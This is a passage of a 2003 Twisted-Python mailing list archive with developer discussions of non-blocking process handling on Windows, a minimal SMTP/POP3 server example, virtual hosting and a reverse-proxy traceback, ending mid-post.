> holding up the reactor's runloop.
> 
> See also: 
> http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html
> 
> Hope that helps. :)
> 
> Diz
> 
> On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson 
> wrote:
> 
> > I have some code in my xmlrpc service that executes commands using
> > process.py (http://starship.python.net/crew/tmick/).  The service 
> > appears
> > to block this code, thus only allowing one connection to get any work
> > done at a time, at least while the commands are being executed.  
> > Should I
> > be wrapping this up in a Deferred somehow to avoid blocking?
> >
> > Slowly but surely this is starting to make sense to me.  Twisted rocks!
> >
> > Thanks.
> > -Justin
> >
> > _______________________________________________
> > Twisted-Python mailing list
> > Twisted-Python at twistedmatrix.com
> > http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.2.1 (Darwin)
> 
> iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
> m830zVM1AnnL3fF76V1WHqY=
> =39jf
> -----END PGP SIGNATURE-----
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From bob at redivi.com  Fri Jul 25 08:39:48 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 10:39:48 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725141752.398A938393@www.fastmail.fm>
Message-ID: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>

That's kind of amusing.  I'm not particularly familiar with the log or  
win32eventreactor modules... but as far as I can tell, those messages  
mean "dude, don't use log.logOwner anymore".  It's not your fault, it's  
the twisted team's fault for not keeping win32eventreactor up to date  
with the latest conventions.  They're just DeprecationWarnings, so  
they're harmless to everything other than your eyes and our pride :)

Also, instead of using that reactor.iterate() hack.. it's better to be  
in the habit of writing something event driven.. for example, you could  
override the __init__ for protocol.ProcessProtocol (well, it's not  
really overriding anything, since it doesn't have one) from your  
subclass, stick a Deferred in the instance, and do a callback in  
processEnded... like this:

class MyProcessProtocol(protocol.ProcessProtocol):
	def __init__(self):
		self.deferred = defer.Deferred()

	...cut and paste your code...

	def processEnded(self, reason):
		...cut and paste some more code...
		self.deferred.callback(reason)

...cut and paste again, but throw out your for loop...
p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
reactor.run()

The reactor.callLater(0.0, ....) is just to prevent the reactor from  
shutting down before it starts, because a deferred could theoretically  
fire immediately.  I'm pretty sure it couldn't in this case, but I  
usually put it there anyway when I'm stopping a reactor because in some  
situations it can (usually a bug in my code that causes an errback  
immediately, or something).

-bob

On Friday, Jul 25, 2003, at 10:17 America/New_York, Justin Johnson  
wrote:

> Since I'm running on win2k (ugh!) I followed the instructions to use
> win32eventreactor instead of the default posix reactor.  I did read
> through the docstrings, and it does mention that process calling can be
> problematic.  I ran the code below and got the following error.  Is it
> possible to get this working on windows?  It is marked as semi-stable.
> Man I hate windows!  Unfortunately the servers I support are all  
> windows
> boxes.
>
>
> C:\Python22\Lib\site- 
> packages\twisted\internet\win32eventreactor.py:198:
> Depreca
> tionWarning: Foolish capitalist!  Your opulent toilet will be your
> undoing!!
>   log.logOwner.own(fd)
> C:\Python22\Lib\site- 
> packages\twisted\internet\win32eventreactor.py:213:
> Depreca
> tionWarning: The proletariat is victorious.
>   log.logOwner.disown(fd)
>
>
> [snip]
> from twisted.internet import protocol
> from twisted.internet import win32eventreactor
> win32eventreactor.install()
> from twisted.internet import reactor
>
> class MyProcessProtocol(protocol.ProcessProtocol):
> 	finished = 0
>
> 	def connectionMade(self):
> 		self.data = ''
> 		self.err = ''
> 		self.transport.write("connectionMade")
>
> 	def outReceived(self, data):
> 		self.data = self.data + data
>
> 	def outConnectionLost(self):
> 		self.transport.write("outConnectionLost")
>
> 	def errReceived(self, data):
> 		self.err = self.err + data
> 		self.transport.write("errReceived")
>
> 	def errConnectionLost(self):
> 		self.transport.write("errConnectionLost")
>
> 	def inConnectionLost(self):
> 		self.transport.write("inConnectionLost")
>
> 	def processEnded(self, reason):
> 		self.finished = 1
> 		self.reason = reason
> 		self.transport.write("processEnded")
>
>
> exe = r"c:\program files\rational\clearcase\bin\cleartool.exe"
> p = MyProcessProtocol()
> reactor.spawnProcess(p, exe, [exe, "lsview", "-s"], env=None)
> while not p.finished:
> 	reactor.iterate()
> [/snip]
>
>
> On Wed, 23 Jul 2003 14:42:15 -0600, "Dave Smith" <dizzyd at jabber.org>
> said:
>> -----BEGIN PGP SIGNED MESSAGE-----
>> Hash: SHA1
>>
>> Sounds to me like you want to use a deferToThread(...), to pass the
>> calls off to the reactor's thread pool so they can run there without
>> holding up the reactor's runloop.
>>
>> See also:
>> http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html
>>
>> Hope that helps. :)
>>
>> Diz
>>
>> On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson
>> wrote:
>>
>>> I have some code in my xmlrpc service that executes commands using
>>> process.py (http://starship.python.net/crew/tmick/).  The service
>>> appears
>>> to block this code, thus only allowing one connection to get any work
>>> done at a time, at least while the commands are being executed.
>>> Should I
>>> be wrapping this up in a Deferred somehow to avoid blocking?
>>>
>>> Slowly but surely this is starting to make sense to me.  Twisted  
>>> rocks!
>>>
>>> Thanks.
>>> -Justin
>>>
>>> _______________________________________________
>>> Twisted-Python mailing list
>>> Twisted-Python at twistedmatrix.com
>>> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>> -----BEGIN PGP SIGNATURE-----
>> Version: GnuPG v1.2.1 (Darwin)
>>
>> iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
>> m830zVM1AnnL3fF76V1WHqY=
>> =39jf
>> -----END PGP SIGNATURE-----
>>
>>
>> _______________________________________________
>> Twisted-Python mailing list
>> Twisted-Python at twistedmatrix.com
>> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From justinjohnson at fastmail.fm  Fri Jul 25 09:42:29 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 09:42:29 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>
References: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>
Message-ID: <20030725154229.4531337E32@www.fastmail.fm>

Thanks for the reply.  Questions below.

On Fri, 25 Jul 2003 10:39:48 -0400, "Bob Ippolito" <bob at redivi.com> said:
> That's kind of amusing.  I'm not particularly familiar with the log or  
> win32eventreactor modules... but as far as I can tell, those messages  
> mean "dude, don't use log.logOwner anymore".  It's not your fault, it's  
> the twisted team's fault for not keeping win32eventreactor up to date  
> with the latest conventions.  They're just DeprecationWarnings, so  
> they're harmless to everything other than your eyes and our pride :)
> 
> Also, instead of using that reactor.iterate() hack.. it's better to be  
> in the habit of writing something event driven.. for example, you could  
> override the __init__ for protocol.ProcessProtocol (well, it's not  
> really overriding anything, since it doesn't have one) from your  
> subclass, stick a Deferred in the instance, and do a callback in  
> processEnded... like this:
> 
> class MyProcessProtocol(protocol.ProcessProtocol):
> 	def __init__(self):
> 		self.deferred = defer.Deferred()
> 
> 	...cut and paste your code...
> 
> 	def processEnded(self, reason):
> 		...cut and paste some more code...
> 		self.deferred.callback(reason)

reason is an Exception from twisted.internet.error.  It is an instance of
ProcessDone if it completes successfully.  How can this be called?  When
I was using the other process.py module, it allowed me to get stdout,
stderr, and the status.  That is really all I want to do.  So it seems
like stdout and stderr are easy to get with the xxxReceived methods, and
then the status would have to be determined from the type of exception
processEnded gets as the "reason" argument, right?

I used to have code like...

cmd = "cmd arg1 arg2"
p = process.ProcessOpen(cmd)
status = p.wait()
stdout = p.stdout.read()
stderr = p.stderr.read()
if status != 0:
    raise errors.CmdError(cmd, status, stdout, stderr) # an Exception I
    defined

...and this was in a module that didn't know about twisted, and I'd
prefer to keep it that way if possible.  What is the best way to wrap a
class with methods that contain code like this up with twisted?  Attached
is the latest version of the ProcessProtocol code which is working
(except for not knowing exactly how to get the real status).  I'm just
not sure what to do with it.

> 
> ...cut and paste again, but throw out your for loop...
> p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
> reactor.run()

p is not a Deferred, so I can't call addBoth.  It seems to work okay
without this though.  What was this supposed to be added to?

-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/unknown
Size: 1199 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030725/4d6848c9/attachment-0002.bin>

From bob at redivi.com  Fri Jul 25 10:38:09 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 12:38:09 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725154229.4531337E32@www.fastmail.fm>
Message-ID: <60234460-BEBE-11D7-B892-000A95686CD8@redivi.com>

On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
wrote:

> Thanks for the reply.  Questions below.
>
> On Fri, 25 Jul 2003 10:39:48 -0400, "Bob Ippolito" <bob at redivi.com> 
> said:
>> That's kind of amusing.  I'm not particularly familiar with the log or
>> win32eventreactor modules... but as far as I can tell, those messages
>> mean "dude, don't use log.logOwner anymore".  It's not your fault, 
>> it's
>> the twisted team's fault for not keeping win32eventreactor up to date
>> with the latest conventions.  They're just DeprecationWarnings, so
>> they're harmless to everything other than your eyes and our pride :)
>>
>> Also, instead of using that reactor.iterate() hack.. it's better to be
>> in the habit of writing something event driven.. for example, you 
>> could
>> override the __init__ for protocol.ProcessProtocol (well, it's not
>> really overriding anything, since it doesn't have one) from your
>> subclass, stick a Deferred in the instance, and do a callback in
>> processEnded... like this:
>>
>> class MyProcessProtocol(protocol.ProcessProtocol):
>> 	def __init__(self):
>> 		self.deferred = defer.Deferred()
>>
>> 	...cut and paste your code...
>>
>> 	def processEnded(self, reason):
>> 		...cut and paste some more code...
>> 		self.deferred.callback(reason)
>
> reason is an Exception from twisted.internet.error.  It is an instance 
> of
> ProcessDone if it completes successfully.  How can this be called?  
> When
> I was using the other process.py module, it allowed me to get stdout,
> stderr, and the status.  That is really all I want to do.  So it seems
> like stdout and stderr are easy to get with the xxxReceived methods, 
> and
> then the status would have to be determined from the type of exception
> processEnded gets as the "reason" argument, right?
>
> I used to have code like...
>
> cmd = "cmd arg1 arg2"
> p = process.ProcessOpen(cmd)
> status = p.wait()
> stdout = p.stdout.read()
> stderr = p.stderr.read()
> if status != 0:
>     raise errors.CmdError(cmd, status, stdout, stderr) # an Exception I
>     defined
>
> ...and this was in a module that didn't know about twisted, and I'd
> prefer to keep it that way if possible.  What is the best way to wrap a
> class with methods that contain code like this up with twisted?  
> Attached
> is the latest version of the ProcessProtocol code which is working
> (except for not knowing exactly how to get the real status).  I'm just
> not sure what to do with it.
>
>>
>> ...cut and paste again, but throw out your for loop...
>> p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
>> reactor.run()
>
> p is not a Deferred, so I can't call addBoth.  It seems to work okay
> without this though.  What was this supposed to be added to?

it was supposed to be p.deferred.addBoth

I'll look at the rest of your stuff in a bit.

-bob




From bob at redivi.com  Fri Jul 25 10:53:31 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 12:53:31 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725154229.4531337E32@www.fastmail.fm>
Message-ID: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>


On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
wrote:

> reason is an Exception from twisted.internet.error.  It is an instance 
> of
> ProcessDone if it completes successfully.  How can this be called?  
> When
> I was using the other process.py module, it allowed me to get stdout,
> stderr, and the status.  That is really all I want to do.  So it seems
> like stdout and stderr are easy to get with the xxxReceived methods, 
> and
> then the status would have to be determined from the type of exception
> processEnded gets as the "reason" argument, right?

This is untested, since I don't have a windows box around.. didn't 
check for syntax errors.. but I believe this will do what you want it 
to do:

-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/octet-stream
Size: 1723 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030725/72c52506/attachment-0002.obj>

From justinjohnson at fastmail.fm  Fri Jul 25 11:39:34 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 11:39:34 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
Message-ID: <20030725173934.617B237D19@www.fastmail.fm>

Thanks much.  Yes this works.

Can someone else comment on the stability of win32eventreactor, given the
deprecation warnings I'm getting?

-Justin

On Fri, 25 Jul 2003 12:53:31 -0400, "Bob Ippolito" <bob at redivi.com> said:
> 
> On Friday, Jul 25, 2003, at 11:42 America/New_York, Justin Johnson 
> wrote:
> 
> > reason is an Exception from twisted.internet.error.  It is an instance 
> > of
> > ProcessDone if it completes successfully.  How can this be called?  
> > When
> > I was using the other process.py module, it allowed me to get stdout,
> > stderr, and the status.  That is really all I want to do.  So it seems
> > like stdout and stderr are easy to get with the xxxReceived methods, 
> > and
> > then the status would have to be determined from the type of exception
> > processEnded gets as the "reason" argument, right?
> 
> This is untested, since I don't have a windows box around.. didn't 
> check for syntax errors.. but I believe this will do what you want it 
> to do:
> 



From warner at lothar.com  Fri Jul 25 11:58:28 2003
From: warner at lothar.com (Brian Warner)
Date: Fri, 25 Jul 2003 10:58:28 -0700 (PDT)
Subject: [Twisted-Python] unlistenTCP not working?
References: <00de01c35207$2de818e0$0201a8c0@dan>
 <20030724134225.617d4fca.itamar@itamarst.org>
 <007301c35289$1cc58610$0201a8c0@dan>
Message-ID: <20030725.105828.00573123.warner@lothar.com>

> Ok, I didn't realise listenTCP returned Port objects.

Also note the returned Port object can tell you which proto/host/port it is
listening on. This means you can tell it to listen on "0" (which means "pick
the next available port") and then find out later which port number it
decided to use. This could be useful for things like the FTP data port where
each file transfer opens up a new port and the port number is sent over an
existing connection to the other end.

 p = reactor.listenTCP(0, factory)
 print "now listening on port", p.getHost()[2]


cheers,
 -Brian



From radix at twistedmatrix.com  Fri Jul 25 11:58:54 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 25 Jul 2003 13:58:54 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725173934.617B237D19@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com> <20030725173934.617B237D19@www.fastmail.fm>
Message-ID: <20030725175854.GA25197@radii>

On Fri, Jul 25, 2003 at 11:39:34AM -0600, Justin Johnson wrote:
> Thanks much.  Yes this works.
> 
> Can someone else comment on the stability of win32eventreactor, given the
> deprecation warnings I'm getting?

The DeprecationWarnings aren't indicative of anything other than the
fact that nobody's gotten around to updating it yet. However, I have
had a problem with the win32eventreactor before, when using it with a
Tkinter GUI. I don't know if it was Tkinter or win32eventreactor that
was causing the problem, but I think it was related to threads. It
would segfault non-deterministically (inside of Tkinter code) when I
tried to do some things. However, it was always before any of the
process code was run, so I don't think it had anything to do with
that. I just decided to switch to the select reactor, with no signal
handlers installed, and use popen(), because the processes I was
executing didn't take long.

So, all I have to say is, if you use win32eventreactor with Tkinter,
you might have some problems.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 25 12:00:20 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 14:00:20 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725173934.617B237D19@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
	<20030725173934.617B237D19@www.fastmail.fm>
Message-ID: <20030725140020.6f507950.itamar@itamarst.org>

On Fri, 25 Jul 2003 11:39:34 -0600
"Justin Johnson" <justinjohnson at fastmail.fm> wrote:

> Can someone else comment on the stability of win32eventreactor, given
> the deprecation warnings I'm getting?

It's stable, but not scalable (limited to 64 events, which includes
sockets, processes and so on.) At some point sometime I will work on
Thomas Heller's new win32 reactor which fixes this, but I have no
motivation at the moment.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Fri Jul 25 12:51:21 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 12:51:21 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725140020.6f507950.itamar@itamarst.org>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
 	<20030725173934.617B237D19@www.fastmail.fm> <20030725140020.6f507950.itamar@itamarst.org>
Message-ID: <20030725185121.1B75133420@www.fastmail.fm>

On Fri, 25 Jul 2003 14:00:20 -0400, "Itamar Shtull-Trauring"
<itamar at itamarst.org> said:
> On Fri, 25 Jul 2003 11:39:34 -0600
> "Justin Johnson" <justinjohnson at fastmail.fm> wrote:
> 
> > Can someone else comment on the stability of win32eventreactor, given
> > the deprecation warnings I'm getting?
> 
> It's stable, but not scalable (limited to 64 events, which includes
> sockets, processes and so on.) At some point sometime I will work on
> Thomas Heller's new win32 reactor which fixes this, but I have no
> motivation at the moment.

Okay, thanks for the info.  I may try out Thomas's code myself in the
meantime.  The lack of motivation is understandable.  Man, I wish I
didn't support windows boxes!

-Justin



From itamar at itamarst.org  Fri Jul 25 13:50:01 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 15:50:01 -0400
Subject: [Twisted-Python] New PB connection API
Message-ID: <20030725155001.69d11afc.itamar@itamarst.org>

First sketch is in CVS. Please comment if you have any issues with it,
I'd like to refactor old APIs to use new API next.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From daleedom at hightowergroup.com  Fri Jul 25 14:22:34 2003
From: daleedom at hightowergroup.com (David A. Leedom)
Date: Fri, 25 Jul 2003 16:22:34 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030721233545.GJ10749@frobozz>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
 <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>

Andrew,

The problem is that I don't quite "get" Twisted yet.  The output from TAP 
does not seem to do it for me.  I need a step by step quick and dirty 
example.  Even if someone could tease out the python short-hand that the 
TAP puts out, that would help.

Thanks,

Dave Leedom

At 09:35 AM 7/22/2003 +1000, Andrew Bennetts wrote:

>On Mon, Jul 21, 2003 at 01:13:13PM -0400, David A. Leedom wrote:
> > I am new to Twisted Matrix.
> >
> > I am trying to setup an mail system that will use a database as the
> > datastore for emails, domains and user access (both pop3/imap and stmp).
> >
> > What I am looking for is a code snipit example of how to setup a POP3 and
> > SMTP server using frame work without using the TAP utility.
> >
> > I figure once I have this example then I can begin to understand the
> > documentation better.  There is something missing in the explanation of 
> how
> > things work.  It just goes over my head.
>
>Why not look at how the TAP utility does it? :)
>
>Have a look at twisted/mail/tap.py, in particular the 'updateApplication'
>method.
>
>Also, I believe that IMAP, POP3 and SMTP have all had a lot of work done on
>them in CVS recently, so it might be worth using CVS, or at least the latest
>alpha release (1.0.7 alpha 2).  They're improving quite rapidly, judging
>from the number of commits (and tests!) Jp is making.
>
>-Andrew.
>
>
>_______________________________________________
>Twisted-Python mailing list
>Twisted-Python at twistedmatrix.com
>http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>
>
>---
>Incoming mail is certified Virus Free.
>Checked by AVG anti-virus system (http://www.grisoft.com).
>Version: 6.0.498 / Virus Database: 297 - Release Date: 7/8/2003



The Hightower Group, Inc.
Information Technology Consulting

165 West Airport Road/Lititz, PA 17543
V:717-560-4002, 877-560-4002 x: 114
F:717-560-2825
www.hightowergroup.com 
-------------- next part --------------

---
Outgoing mail is certified Virus Free.
Checked by AVG anti-virus system (http://www.grisoft.com).
Version: 6.0.502 / Virus Database: 300 - Release Date: 7/18/2003

From itamar at itamarst.org  Fri Jul 25 14:31:43 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 25 Jul 2003 16:31:43 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
	<5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
	<5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
Message-ID: <20030725163143.06c62ac2.itamar@itamarst.org>

On Fri, 25 Jul 2003 16:22:34 -0400
"David A. Leedom" <daleedom at hightowergroup.com> wrote:

> The problem is that I don't quite "get" Twisted yet.  The output from
> TAP does not seem to do it for me.  I need a step by step quick and
> dirty example.  Even if someone could tease out the python short-hand
> that the TAP puts out, that would help.

Read twisted/tap/mail.py


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From exarkun at intarweb.us  Fri Jul 25 14:39:03 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Fri, 25 Jul 2003 16:39:03 -0400
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com> <5.2.0.9.0.20030725161924.027d6d10@mail.hightowergroup.com>
Message-ID: <20030725203903.GA25109@intarweb.us>

On Fri, Jul 25, 2003 at 04:22:34PM -0400, David A. Leedom wrote:
> Andrew,
> 
> The problem is that I don't quite "get" Twisted yet.  The output from TAP 
> does not seem to do it for me.  I need a step by step quick and dirty 
> example.  Even if someone could tease out the python short-hand that the 
> TAP puts out, that would help.

  Untested:

    from twisted.internet import reactor

    from twisted import mail
    import twisted.mail.mail
    import twisted.mail.maildir

    service = mail.mail.MailService('ExampleMail')
    smtp = service.getSMTPFactory()
    pop3 = service.getPOP3Factory()

    domain = mail.maildir.MaildirDirdbmDomain(service, '/path/to/domain')
    domain.addUser('username', 'password')
    svc.addDomain('domain.name', domain)

    reactor.listenTCP(25, smtp, interface='127.0.0.1')
    reactor.listenTCP(110, pop3, interface='127.0.0.1')

    reactor.run()

  Jp


-- 
No, `Eureka' is Greek for `This bath is too hot.'
                -- Dr. Who
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030725/b6e85da6/attachment.sig>

From mario at ruggier.org  Fri Jul 25 14:40:40 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Fri, 25 Jul 2003 22:40:40 +0200
Subject: [Twisted-Python] Mail Server
In-Reply-To: <20030725163143.06c62ac2.itamar@itamarst.org>
Message-ID: <410F4E3C-BEE0-11D7-82EF-000393756786@ruggier.org>

On Vendredi, juil 25, 2003, at 22:31 Europe/Zurich, Itamar 
Shtull-Trauring wrote:
> On Fri, 25 Jul 2003 16:22:34 -0400
> "David A. Leedom" <daleedom at hightowergroup.com> wrote:
>
>> The problem is that I don't quite "get" Twisted yet.  The output from
>> TAP does not seem to do it for me.  I need a step by step quick and
>> dirty example.  Even if someone could tease out the python short-hand
>> that the TAP puts out, that would help.
>
> Read twisted/tap/mail.py

another thing i sometimes find useful is to use the tapconvert utility
to generate a corresponding TAS, and peek inside... something like:
% tapconvert -i <tapfile> -o <tasfile> -t source

mario

> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting




From mesozoic at polynode.com  Fri Jul 25 16:26:17 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Fri, 25 Jul 2003 22:26:17 +0000
Subject: [Twisted-Python] Using ResourceSubscription with vhost
Message-ID: <20030725222617.GI282@perpetual.moxn.net>

I am using twisted-web to serve a number of virtual hosts.  I'd like one of
these virtual hosts to point to a ResourceSubscription I've got set up.

The code in the first example works, the second does not.

--- This works - /etc/twisted-web/local.d/50vhost.py ---

rs = distrib.ResourceSubscription('unix', 'socketpath')
file = static.File('/somewhere')
file.putChild('rs', rs)
root.addHost('my.domain.com', file)

--- This doesn't ---

rs = distrib.ResourceSubscription('unix', 'socketpath')
root.addHost('my.domain.com', rs)

--- snip snip ---

If I use the second example, navigating to http://my.domain.com/anything
results in a 'No such child resource' error message. So, am I missing
something that should be more obvious, or is this a real bug?

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From David.McCurley at technologist.com  Fri Jul 25 19:11:24 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 25 Jul 2003 21:11:24 -0400
Subject: [Twisted-Python] ProxyClient error using ReverseProxy
Message-ID: <1059181884.14038.12.camel@mars.mccurleyweb.net>

I'm working on full reverse proxy functionality and have run into an
error (twisted 1.0.6) during some basic testing.

SYNOPSIS:

- Made a root ReverseProxyResource that goes to google from
http://localhost:8080/ in my web.tap

- Using Mozilla 1.4, hit the local url, all is okay

- Now click the refresh button and an exception is thrown in the console
window running the tap.

- Reload again and no error, reload again and exception, repeatable
every other time.

I'm not clear on the full call details but the refresh that causes the
exception has a request already queued, so when the
ProxyClient.handleRequest calls the self.father.transport.loseConnection
method, the exception triggers because the transport is a
StringTransport in the queued request and it doesn't have a
"loseConnection" method.

I've been trying to trace this to submit a patch, but its not clear to
me what the queuing is for or why this is happening, or when to call
loseConnection.

DETAILS:

Made an .rpy file and a web tap that made it the root resource:

t1.rpy
===========================
import twisted.web.proxy

resource = twisted.web.proxy.ReverseProxyResource('www.google.com', 80,
'')
===========================

In mozilla 1.4 get http://localhost:8080/

Console output:
====================
2003/07/25 19:03 EDT [HTTPChannel,0,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x840eccc>
2003/07/25 19:03 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x840eccc>
2003/07/25 19:03 EDT [HTTPChannel,1,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8416fb4>
====================

Now click reload after a few seconds (Mozilla icon stays spinning this
time like it has an open connection its waiting on):

Console output:
====================
2003/07/25 19:04 EDT [HTTPChannel,1,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8411b3c>
2003/07/25 19:04 EDT [ProxyClient,client] Traceback (most recent call
last):
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
472, in doSelect
            _logrun(selectable, _drdw, selectable, method, dict)
          File "/usr/lib/python2.2/site-packages/twisted/python/log.py",
line 65, in callWithLogger
            callWithContext({"system": lp}, func, *args, **kw)
          File "/usr/lib/python2.2/site-packages/twisted/python/log.py",
line 52, in callWithContext
            return context.call({ILogContext: newCtx}, func, *args,
**kw)
          File
"/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32,
in callWithContext
            return func(*args,**kw)
        --- <exception caught here> ---
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
481, in _doReadOrWrite
            why = getattr(selectable, method)()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line
216, in doRead
            return self.protocol.dataReceived(data)
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/basic.py", line 184,
in dataReceived
            return self.rawDataReceived(data)
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 354,
in rawDataReceived
            self.handleResponseEnd()
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 336,
in handleResponseEnd
            self.handleResponse(b)
          File "proxy.py", line 72, in handleResponse
             
          File
"/usr/lib/python2.2/site-packages/twisted/protocols/http.py", line 285,
in __getattr__
            return getattr(self.__dict__['s'], attr)
        exceptions.AttributeError: loseConnection
 
2003/07/25 19:04 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x8411b3c>

====================

Reload again and this time the following output happens at the console
and the Mozilla icon stops spinning like all connections are closed.

Console output:
====================
2003/07/25 19:04 EDT [HTTPChannel,2,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84266ac>
2003/07/25 19:04 EDT [ProxyClient,client] Stopping factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84266ac>
2003/07/25 19:04 EDT [HTTPChannel,3,127.0.0.1] Starting factory
<twisted.web.proxy.ProxyClientFactory instance at 0x84454a4>
====================

Reload again and it starts spinning and gives same type of exception
trace as above.

Any pointers on where to look or how to fix this?

Thanks,

David






From jgoerzen at complete.org  Sat Jul 26 07:48:15 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 08:48:15 -0500
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
Message-ID: <20030726134815.GA26482@complete.org>

Hello,

I am the author of OfflineIMAP, a multi-threaded multi-account
bi-directional synchronization tool
(http://quux.org/devel/offlineimap) written in Python.

I am running up against several limitations of the current way I'm
doing things.  They include:

1. Lack of thread groups in Python, meaning that if there was a
   network error synchronizing account A, I'd also have to kill off
   the entire application and the synchronizing threads for account B
